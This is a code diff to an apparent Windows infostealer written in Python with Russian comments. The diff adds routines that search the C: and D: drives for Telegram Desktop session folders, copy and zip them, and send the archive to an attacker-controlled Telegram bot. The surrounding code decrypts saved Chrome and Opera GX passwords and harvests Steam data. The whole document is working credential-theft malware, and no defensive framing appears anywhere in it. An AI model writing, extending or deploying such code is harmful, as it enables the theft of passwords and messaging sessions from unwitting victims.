@@ -1,20 +1,18 @@
-import base64
-import datetime
-import json
-import os
-import shutil
-import sqlite3
+import base64, datetime, json
+import os, shutil, sqlite3
 from requests import Session
 import win32crypt
 from Crypto.Cipher import AES
 from config import TOKEN, CHAT_ID
+
+VERSION = 1.0
 
 url_Document = f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}'
 url_text = lambda text: f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}'
 
 paths_Telegram = (
 	os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata",
-	'D:\\Telegram Desktop\\tdata', 'C:\\Program Files\\Telegram Desktop\\tdata'
+	'D:\\Telegram Desktop\\tdata', 'C:\\Program Files\\Telegram Desktop\\tdata',
 	)  # папки где могут храниться данные телеграмма
 
 current_user = os.getlogin()  # имя пользователя
@@ -162,28 +160,39 @@ class Telegram:
 				break
 			except: pass
 
-		if not os.path.exists(tg_path): # если нет папки -> завершение процесса
+		if not os.path.exists(tg_path): # если нет папки -> включение поиска
+			ignore_folders = []
+			next_folder = True
+
+			try:
+				for root, dirs, files in os.walk("D:\\"):
+					# dirs = [d for d in dirs if d not in ignore_folders]
+					if 'Telegram Desktop' in dirs:
+						shutil.copytree(root + '\\Telegram Desktop\\tdata', tg_path, ignore=shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3", "webview"))
+						next_folder = False
+						break
+			except: pass
+			
+			try:
+				ignore_folders = ['All Users', 'Default', 'Default User', 'Windows', 'ProgramData', 'Public', 'Default']
+
+				if next_folder:
+					for root, dirs, files in os.walk("C:\\"):
+						dirs = [d for d in dirs if d not in ignore_folders]
+						if 'Telegram Desktop' in dirs:
+							shutil.copytree(root + '\\Telegram Desktop', tg_path, ignore=shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3", "webview"))
+							break
+			except: pass
+
+		if not os.path.exists(tg_path): # повторная проверка, если нет папки -> завершение процесса
 			Support.send_error("Telegram")
 			return False
 
-		try:
-			# удаляем ненужные файлы размером больше 500кб
-			listdir = os.listdir(tg_path)
-			is_dir = ''
-			for i in listdir:
-				if os.path.isdir(f'{tg_path}\\{i}'): 
-					is_dir = f'{tg_path}\\{i}'
-					continue
-
-				if Telegram.get_size(f'{tg_path}\\{i}'):
-					os.remove(f'{tg_path}\\{i}')
-
-			# удаляем ненужные файлы размером больше 500кб
-			listdir = os.listdir(is_dir)
-			for i in listdir:
-				if Telegram.get_size(f'{is_dir}\\{i}'):
-					os.remove(f'{is_dir}\\{i}')
-		except: pass
+		# удаляем ненужные файлы размером больше 500кб
+		for root, dirs, files in os.walk(tg_path):
+			for file in files: # проверка всех файлов в текущей директории
+				if os.path.getsize(file_path:=os.path.join(root, file)) > 540000:
+					os.remove(file_path)
 
 		try:
 			shutil.make_archive(tg_path, 'zip', tg_path)  # 1) где вывести файл 2) формат 3) путь к папке которую надо упаковать
@@ -193,11 +202,6 @@ class Telegram:
 			shutil.rmtree(tg_path)  # удаляем папку с файлами
 			return True
 		except: pass
-
-	@staticmethod
-	def get_size(path) -> bool:
-		""" удаляем ненужный файл размером 16561кб (он появляется когда в тг ставят обои и нафиг не нужен) """
-		return os.path.getsize(path) > 540000
 
 	@staticmethod
 	def send_tg_logs():
@@ -223,7 +227,7 @@ class Telegram:
 class Chrome:
 	""" Данные Chrome"""
 	path = r'\AppData\Local\Google\Chrome\User Data\Local State'  # путь до файла с зашифрованным мастер паролем
-	def check_browzer():
+	def check_browzer(self):
 		if not os.path.exists(Chrome.path):
 			raise Exception
 
@@ -319,7 +323,7 @@ class Chrome:
 class OperaGX:
 	""" Данные OperaGX GX"""
 	path = r'\AppData\Roaming\Opera Software\Opera GX Stable\Local State'
-	def check_browzer():
+	def check_browzer(self):
 		if not os.path.exists(OperaGX.path):
 			raise Exception
 	# ----------------------------------------------- Логины и Пароли начало скрипта
@@ -445,30 +449,3 @@ if __name__ == '__main__':
 	Steam.main()
 	Telegram.main()
 
-
-#-----------------------------------Можно удалить при желании------------------------------------------------------------
-# from tkinter import *
-# from tkinter import messagebox
-# import random
-
-# def Yes():
-#     messagebox.showinfo(' ', 'Ну ты и черт)')
-#     quit()
-
-# def motionMouse(event):
-#     btnNo.place(x=random.randint(0, 300), y=random.randint(0, 300))
-
-# root=Tk()
-# root.geometry('400x400')
-# root.title('Oпрос')
-# root.resizable(width=False, height=False)
-# root['bg'] = 'white'
-
-# label = Label(root, text='Любишь маму?', font='Arial 20 bold', bg='white').pack()
-# btnYes = Button(root, text='Нет', font='Arial 20 bold', command=Yes).place(x=160, y=100)
-# btnNo = Button(root, text='Да', font='Arial 20 bold')
-# btnNo.place(x=250, y=100)
-# btnNo.bind('<Enter>', motionMouse)
-
-# root.mainloop()
-#-----------------------------------Можно удалить при желании------------------------------------------------------------
